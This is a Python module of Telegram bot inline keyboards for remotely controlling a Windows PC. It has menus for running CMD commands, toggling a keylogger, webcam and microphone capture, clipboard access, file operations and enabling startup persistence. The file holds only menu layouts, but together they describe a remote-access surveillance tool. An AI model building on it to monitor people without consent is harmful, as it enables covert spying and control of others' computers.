"""
Клавиатуры для Telegram-бота.
Все меню реализованы через InlineKeyboardMarkup для навигации внутри чата.
"""

import base64
from telegram import InlineKeyboardButton, InlineKeyboardMarkup


def encode_path(path: str) -> str:
    """Кодирует путь в base64 для использования в callback_data."""
    encoded = base64.b64encode(path.encode('utf-8')).decode('utf-8')
    return encoded[:60]


def get_main_menu() -> InlineKeyboardMarkup:
    """Главное меню бота."""
    keyboard = [
        [
            InlineKeyboardButton("📋 Process Manager", callback_data="menu_process"),
            InlineKeyboardButton("📁 File Explorer", callback_data="menu_files"),
        ],
        [
            InlineKeyboardButton("⚙️ System Control", callback_data="menu_system"),
            InlineKeyboardButton("🌐 Network Tools", callback_data="menu_network"),
        ],
        [
            InlineKeyboardButton("📊 Monitoring", callback_data="menu_monitor"),
            InlineKeyboardButton("🛠️ Extra Tools", callback_data="menu_extra"),
        ],
        [
            InlineKeyboardButton("🔒 Settings", callback_data="menu_settings"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_process_menu() -> InlineKeyboardMarkup:
    """Меню управления процессами."""
    keyboard = [
        [
            InlineKeyboardButton("📋 List Processes", callback_data="proc_list"),
            InlineKeyboardButton("▶️ Run Process", callback_data="proc_run"),
        ],
        [
            InlineKeyboardButton("❌ Kill Process", callback_data="proc_kill"),
            InlineKeyboardButton("🔄 Restart Process", callback_data="proc_restart"),
        ],
        [
            InlineKeyboardButton("🎯 Change Priority", callback_data="proc_priority"),
            InlineKeyboardButton("👁️ Watch Process", callback_data="proc_watch"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_file_menu(current_path: str = "") -> InlineKeyboardMarkup:
    """Меню файлового менеджера."""
    keyboard = [
        [
            InlineKeyboardButton("💾 Download", callback_data="file_download"),
            InlineKeyboardButton("🗑️ Delete", callback_data="file_delete"),
        ],
        [
            InlineKeyboardButton("✏️ Rename", callback_data="file_rename"),
            InlineKeyboardButton("📦 Move", callback_data="file_move"),
        ],
        [
            InlineKeyboardButton("📄 Copy", callback_data="file_copy"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="file_back"),
            InlineKeyboardButton("🏠 Root", callback_data="file_root"),
            InlineKeyboardButton("🔄 Refresh", callback_data="file_refresh"),
        ],
    ]
    if current_path:
        keyboard.insert(0, [InlineKeyboardButton(f"📂 {current_path}", callback_data="file_current")])
    return InlineKeyboardMarkup(keyboard)


def get_drives_menu() -> InlineKeyboardMarkup:
    """Меню выбора дисков."""
    import string
    from pathlib import Path
    
    keyboard = []
    row = []
    for drive in string.ascii_uppercase:
        drive_path = f"{drive}:\\"
        if Path(drive_path).exists():
            row.append(InlineKeyboardButton(f"💿 {drive}:", callback_data=f"drive_{drive}"))
            if len(row) >= 3:
                keyboard.append(row)
                row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
    return InlineKeyboardMarkup(keyboard)


def get_directory_contents(path: str, items: list) -> InlineKeyboardMarkup:
    """Клавиатура с содержимым директории."""
    keyboard = []

    if path != "":
        keyboard.append([InlineKeyboardButton("📁 ..", callback_data="dir_up")])

    folders = [item for item in items if item['is_dir']]
    for folder in folders[:15]:
        name = folder['name'][:30]
        keyboard.append([InlineKeyboardButton(f"📁 {name}", callback_data=f"dir_{folder['path']}")])

    files = [item for item in items if not item['is_dir']]
    for file in files[:15]:
        name = file['name'][:30]
        keyboard.append([InlineKeyboardButton(f"📄 {name}", callback_data=f"file_{file['path']}")])

    nav_row = [
        InlineKeyboardButton("🔙 Back", callback_data="file_back"),
        InlineKeyboardButton("🏠 Root", callback_data="file_root"),
        InlineKeyboardButton("🔄 Refresh", callback_data="file_refresh"),
    ]
    keyboard.append(nav_row)

    return InlineKeyboardMarkup(keyboard)


def get_file_actions_menu(file_path: str) -> InlineKeyboardMarkup:
    """Меню действий с файлом."""
    encoded_path = encode_path(file_path)
    keyboard = [
        [InlineKeyboardButton(f"📄 {file_path}", callback_data="file_current")],
        [
            InlineKeyboardButton("💾 Download", callback_data=f"file_downloadb_{encoded_path}"),
            InlineKeyboardButton("🗑️ Delete", callback_data=f"file_deleteb_{encoded_path}"),
        ],
        [
            InlineKeyboardButton("✏️ Rename", callback_data=f"file_renameb_{encoded_path}"),
            InlineKeyboardButton("📦 Move", callback_data=f"file_moveb_{encoded_path}"),
        ],
        [
            InlineKeyboardButton("📄 Copy", callback_data=f"file_copyb_{encoded_path}"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="file_back"),
            InlineKeyboardButton("🏠 Root", callback_data="file_root"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_system_menu() -> InlineKeyboardMarkup:
    """Меню управления системой."""
    keyboard = [
        [
            InlineKeyboardButton("🔴 Shutdown PC", callback_data="sys_shutdown"),
            InlineKeyboardButton("🔄 Restart PC", callback_data="sys_restart"),
        ],
        [
            InlineKeyboardButton("😴 Sleep", callback_data="sys_sleep"),
            InlineKeyboardButton("🔒 Lock PC", callback_data="sys_lock"),
        ],
        [
            InlineKeyboardButton("📸 Screenshot", callback_data="sys_screenshot"),
            InlineKeyboardButton("📷 Webcam Capture", callback_data="sys_webcam"),
        ],
        [
            InlineKeyboardButton("🎤 Mic Record", callback_data="sys_mic_record"),
            InlineKeyboardButton("📋 Clipboard View", callback_data="sys_clipboard"),
        ],
        [
            InlineKeyboardButton("🧹 Cleanup Temp", callback_data="sys_cleanup"),
            InlineKeyboardButton("📊 Disk Analysis", callback_data="sys_disk_top"),
        ],
        [
            InlineKeyboardButton("🔴 Monitor Off", callback_data="sys_monitor_off"),
            InlineKeyboardButton("⏰ Set Timer", callback_data="sys_set_timer"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_network_menu() -> InlineKeyboardMarkup:
    """Меню сетевых инструментов."""
    keyboard = [
        [
            InlineKeyboardButton("🌐 Show IP", callback_data="net_show_ip"),
            InlineKeyboardButton("📡 Ping Host", callback_data="net_ping"),
        ],
        [
            InlineKeyboardButton("📊 Netstat", callback_data="net_netstat"),
            InlineKeyboardButton("🔍 DNS Lookup", callback_data="net_dns"),
        ],
        [
            InlineKeyboardButton("⚡ Speedtest", callback_data="net_speedtest"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_monitor_menu() -> InlineKeyboardMarkup:
    """Меню мониторинга."""
    keyboard = [
        [
            InlineKeyboardButton("📈 Monitor CPU", callback_data="mon_cpu"),
            InlineKeyboardButton("💾 Monitor RAM", callback_data="mon_ram"),
        ],
        [
            InlineKeyboardButton("👁️ Watch Directory", callback_data="mon_watch_dir"),
            InlineKeyboardButton("⏹️ Stop Monitoring", callback_data="mon_stop"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_extra_menu() -> InlineKeyboardMarkup:
    """Меню дополнительных инструментов."""
    keyboard = [
        [
            InlineKeyboardButton("💻 Execute CMD", callback_data="extra_cmd"),
            InlineKeyboardButton("⌨️ Toggle Keylogger", callback_data="extra_keylogger"),
        ],
        [
            InlineKeyboardButton("🪟 Windows List", callback_data="extra_windows"),
            InlineKeyboardButton("⌨️ Hotkeys", callback_data="extra_hotkeys"),
        ],
        [
            InlineKeyboardButton("🌐 Open URL", callback_data="extra_open_url"),
            InlineKeyboardButton("🖱️ Remote Mouse", callback_data="extra_mouse"),
        ],
        [
            InlineKeyboardButton("🪟 Active Window", callback_data="extra_active_window"),
            InlineKeyboardButton("📋 Set Clipboard", callback_data="extra_clipboard_set"),
        ],
        [
            InlineKeyboardButton("🎵 Audio Record", callback_data="extra_audio"),
            InlineKeyboardButton("🚀 Startup Enable", callback_data="extra_startup_on"),
        ],
        [
            InlineKeyboardButton("🚫 Startup Disable", callback_data="extra_startup_off"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_window_list_keyboard(windows: list) -> InlineKeyboardMarkup:
    """Клавиатура со списком окон."""
    keyboard = []
    for win in windows[:15]:
        pid = win['pid']
        title = win['title'][:30]
        keyboard.append([
            InlineKeyboardButton(f"🪟 {title}", callback_data=f"win_action_{pid}")
        ])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_extra")])
    return InlineKeyboardMarkup(keyboard)


def get_window_action_keyboard(pid: int) -> InlineKeyboardMarkup:
    """Клавиатура действий с окном."""
    keyboard = [
        [
            InlineKeyboardButton("❌ Close", callback_data=f"win_close_{pid}"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="extra_windows"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_hotkey_menu() -> InlineKeyboardMarkup:
    """Меню горячих клавиш."""
    keyboard = [
        [
            InlineKeyboardButton("💻 Desktop (Win+D)", callback_data="hk_win_d"),
            InlineKeyboardButton("❌ Close (Alt+F4)", callback_data="hk_alt_f4"),
        ],
        [
            InlineKeyboardButton("🔒 Lock (Win+L)", callback_data="sys_lock"),
            InlineKeyboardButton("📂 Explorer (Win+E)", callback_data="hk_win_e"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_extra"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_mouse_menu() -> InlineKeyboardMarkup:
    """Меню управления мышью."""
    keyboard = [
        [
            InlineKeyboardButton("↖️ Up-Left", callback_data="mouse_move_-10_-10"),
            InlineKeyboardButton("⬆️ Up", callback_data="mouse_move_0_-10"),
            InlineKeyboardButton("↗️ Up-Right", callback_data="mouse_move_10_-10"),
        ],
        [
            InlineKeyboardButton("⬅️ Left", callback_data="mouse_move_-10_0"),
            InlineKeyboardButton("🖱️ L-Click", callback_data="mouse_click_left"),
            InlineKeyboardButton("➡️ Right", callback_data="mouse_move_10_0"),
        ],
        [
            InlineKeyboardButton("↙️ Down-Left", callback_data="mouse_move_-10_10"),
            InlineKeyboardButton("⬇️ Down", callback_data="mouse_move_0_10"),
            InlineKeyboardButton("↘️ Down-Right", callback_data="mouse_move_10_10"),
        ],
        [
            InlineKeyboardButton("🖱️ R-Click", callback_data="mouse_click_right"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_extra"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_timer_menu() -> InlineKeyboardMarkup:
    """Меню для установки таймера выключения/сна."""
    keyboard = [
        [
            InlineKeyboardButton("10 min (Sleep)", callback_data="timer_sleep_10"),
            InlineKeyboardButton("30 min (Sleep)", callback_data="timer_sleep_30"),
        ],
        [
            InlineKeyboardButton("60 min (Sleep)", callback_data="timer_sleep_60"),
            InlineKeyboardButton("120 min (Sleep)", callback_data="timer_sleep_120"),
        ],
        [
            InlineKeyboardButton("10 min (Shutdown)", callback_data="timer_shutdown_10"),
            InlineKeyboardButton("30 min (Shutdown)", callback_data="timer_shutdown_30"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_system"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_settings_menu() -> InlineKeyboardMarkup:
    """Меню настроек."""
    keyboard = [
        [
            InlineKeyboardButton("👥 Allowed Users", callback_data="set_users"),
            InlineKeyboardButton("🔑 Change Password", callback_data="set_password"),
        ],
        [
            InlineKeyboardButton("📊 Status", callback_data="set_status"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="menu_main"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_back_menu(menu_name: str) -> InlineKeyboardMarkup:
    """Универсальное меню с кнопкой назад."""
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data=menu_name)],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_confirm_keyboard(action: str, data: str) -> InlineKeyboardMarkup:
    """Клавиатура подтверждения действия."""
    keyboard = [
        [
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{action}_{data}"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_processes_list_keyboard(processes: list) -> InlineKeyboardMarkup:
    """Клавиатура со списком процессов."""
    keyboard = []
    for proc in processes[:20]:
        pid = proc['pid']
        name = proc['name'][:25]
        ram = proc.get('ram', 0)
        keyboard.append([
            InlineKeyboardButton(
                f"{name} (PID:{pid} | {ram:.1f}MB)",
                callback_data=f"proc_action_{pid}"
            )
        ])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_process")])
    return InlineKeyboardMarkup(keyboard)


def get_process_action_keyboard(pid: int) -> InlineKeyboardMarkup:
    """Клавиатура действий с процессом."""
    keyboard = [
        [
            InlineKeyboardButton("❌ Kill", callback_data=f"proc_kill_pid_{pid}"),
            InlineKeyboardButton("🔄 Restart", callback_data=f"proc_restart_pid_{pid}"),
        ],
        [
            InlineKeyboardButton("🔙 Back", callback_data="proc_list"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def get_input_cancel_keyboard() -> InlineKeyboardMarkup:
    """Клавиатура с кнопкой отмены ввода."""
    keyboard = [
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_input")],
    ]
    return InlineKeyboardMarkup(keyboard)
